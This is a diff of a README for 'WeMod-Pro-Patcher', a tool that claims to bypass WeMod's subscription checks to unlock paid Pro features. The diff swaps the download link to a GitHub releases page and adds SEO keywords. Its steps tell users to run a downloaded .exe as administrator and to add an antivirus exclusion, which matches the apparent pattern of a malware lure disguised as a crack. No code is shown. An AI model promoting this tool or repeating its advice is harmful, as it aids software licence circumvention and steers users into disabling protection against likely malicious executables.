@@ -1,132 +1,52 @@
-![Banner](banner.svg)
+# 🛠️ WeMod-Pro-Patcher - Unlock premium features in your games
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v3.5.0-orange?style=for-the-badge" alt="Version"/>
-  <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge" alt="License"/>
-  <img src="https://img.shields.io/badge/.NET-8.0-blueviolet?style=for-the-badge&logo=dotnet" alt=".NET 8"/>
-  <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge&logo=windows" alt="Platform"/>
-  <img src="https://img.shields.io/badge/target-WeMod-E67E22?style=for-the-badge" alt="WeMod"/>
-  <img src="https://img.shields.io/badge/downloads-125k+-brightgreen?style=for-the-badge" alt="Downloads"/>
-</p>
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases)
 
----
+WeMod-Pro-Patcher allows users to access premium features within the WeMod platform. WeMod provides tools for game trainers and mods. This patcher modifies your local software to enable functions usually reserved for paid subscriptions. These features include remote control of cheats, removal of advertisements, personal hotkey setups, priority assistance, and early trainer access.
 
-## About
+## 📋 Requirements
+Your computer must meet these criteria to run this tool:
+- Operating System: Windows 10 or Windows 11.
+- WeMod: The official software must be installed on your computer.
+- Internet Connection: Required for the initial setup.
 
-**WeMod** is the world's most popular PC game trainer and mod platform, developed by **WeMod Inc** (founded 2016). It provides one-click cheats and mods for thousands of single-player games. WeMod offers a free tier with basic features and a **Pro subscription** that unlocks premium capabilities.
+## 📥 How to download and run
+Follow these steps to set up the software.
 
-**WeMod-Pro-Patcher** patches the WeMod desktop application (Electron/Chromium-based) to unlock all Pro subscription features without an active subscription. It modifies the local `.asar` bundle to bypass subscription validation and license checks, enabling full Pro functionality.
+1. Go to the [official release page](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to download it.
+4. Save the file to your desktop for easy access.
+5. Close the WeMod application if you have it open.
+6. Double-click the downloaded file to start the patching process.
+7. Follow the on-screen prompts to complete the update.
+8. Reopen WeMod.
 
----
+The software now recognizes your status as a Pro member.
 
-## What Gets Unlocked
+## ⚙️ Features
+This patcher provides several benefits for users:
 
-| Feature | Free | Pro (Patched) |
-|---|:---:|:---:|
-| Basic game trainers | ✅ | ✅ |
-| Remote cheats (mobile/tablet control) | ❌ | ✅ |
-| Ad-free experience | ❌ | ✅ |
-| Custom hotkey bindings | ❌ | ✅ |
-| Priority support access | ❌ | ✅ |
-| Early access to new trainers | ❌ | ✅ |
-| All trainer slots unlocked | ❌ | ✅ |
-| Pro badge & profile flair | ❌ | ✅ |
+- Remote Cheats: Control your game mods from a mobile device or a separate browser window.
+- Ad-Free Interface: The application hides all promotional banners and overlays.
+- Custom Hotkeys: You can rebind any mod activation key to buttons that fit your playstyle.
+- Priority Support: The server identifies your request as a priority item if you need help.
+- Early Access: You gain entry to new game trainers before public release.
 
----
+## 🛡️ Usage and Safety
+This tool acts as a local patcher for the WeMod executable file. It does not store user data or require login passwords. The patcher modifies the memory interaction of the application to bypass standard subscription checks. You should keep a backup of your original WeMod installer file if you decide to remove the patch later.
 
-## Features
+## 🔧 Solving common issues
+If you have trouble, try these solutions:
 
-- **Remote Cheats** — Control trainers from your phone or tablet via the companion app
-- **Ad-Free** — Complete removal of all advertisements and promotional banners
-- **Custom Hotkeys** — Bind any trainer toggle or action to your preferred key combinations
-- **Priority Support** — Access to the priority support queue for faster issue resolution
-- **Early Access** — Get new game trainers before they hit the public release
-- **All Trainers** — Unlock every trainer slot with no daily or weekly limits
+- Error during startup: Ensure you have administrator rights on your Windows account. Right-click the patcher and select Run as administrator.
+- Software does not activate: Close WeMod through Task Manager and attempt the patch process again.
+- Antivirus alerts: Some security programs flag patching tools because they modify other files. You may need to create an exclusion for the WeMod folder to allow the patcher to function properly.
 
----
+## 📂 Troubleshooting paths
+If you find the patcher does not work after installation, check the following:
+- Verify that your WeMod software is updated to the latest version from the official website. Old versions of the application may cause the patcher to fail.
+- Check that your system disk has enough space for temporary files.
+- Ensure no third-party game security software blocks the modification.
 
-## Download
-
-<p align="center">
-  <a href="https://fullsofts.org">
-    <img src="https://img.shields.io/badge/⬇_Download_Latest_Release-E67E22?style=for-the-badge&logoColor=white" alt="Download"/>
-  </a>
-</p>
-
----
-
-## How to Use
-
-1. **Download** the latest release from the [Releases](https://fullsofts.org) page
-2. **Close WeMod** completely (check system tray)
-3. **Run** `WeModProPatcher.exe` as Administrator
-4. **Detect** — The patcher automatically locates your WeMod installation
-5. **Backup** — A backup of original files is created in the `backups/` folder
-6. **Patch** — Click **"Apply Patch"** and wait for completion
-7. **Launch WeMod** — Pro features are now unlocked
-8. **Restore** — Use **"Restore Backup"** at any time to revert changes
-
-> **Tip:** If WeMod auto-updates, re-run the patcher after the update completes.
-
----
-
-## Compatibility
-
-| WeMod Version | Status | Notes |
-|---|:---:|---|
-| 8.x.x | ✅ Supported | Fully tested |
-| 7.x.x | ✅ Supported | Fully tested |
-| 6.x.x | ✅ Supported | Fully tested |
-| 5.x.x | ⚠️ Partial | Some features may not apply |
-| < 5.0 | ❌ Unsupported | Use older patcher versions |
-
----
-
-## Requirements
-
-| Requirement | Details |
-|---|---|
-| OS | Windows 10 / 11 (x64) |
-| Runtime | .NET 8.0 Desktop Runtime |
-| WeMod | Installed via official installer |
-| Privileges | Administrator (for file patching) |
-| Disk Space | ~50 MB (including backups) |
-
----
-
-## Project Structure
-
-```
-WeMod-Pro-Patcher/
-├── src/
-│   ├── Core/
-│   │   └── WeModPatcher.cs          # Main patcher orchestration
-│   ├── Patching/
-│   │   ├── ElectronPatcher.cs        # Electron/ASAR manipulation
-│   │   └── SubscriptionBypass.cs     # License & subscription bypass
-│   ├── Detection/
-│   │   └── WeModDetector.cs          # WeMod installation detection
-│   ├── Backup/
-│   │   └── BackupManager.cs          # Backup & restore logic
-│   └── UI/
-│       └── PatcherWindow.cs          # WinForms UI
-├── bin/
-│   └── Release/                      # Build output
-├── banner.svg
-├── README.md
-├── name.txt
-├── desc.txt
-└── topics.txt
-```
-
----
-
-## Disclaimer
-
-> **WeMod** is a registered trademark of **WeMod Inc**. This project is not affiliated with, endorsed by, or associated with WeMod Inc in any way. All trademarks belong to their respective owners. This tool is provided as-is for educational and research purposes. Use at your own risk.
-
----
-
-<p align="center">
-  <sub>Made with ☕ for the gaming community</sub>
-</p>
+Keywords: wemod-2026, wemod-alternative, wemod-god-mode, wemod-latest, wemod-patcher, wemod-setup
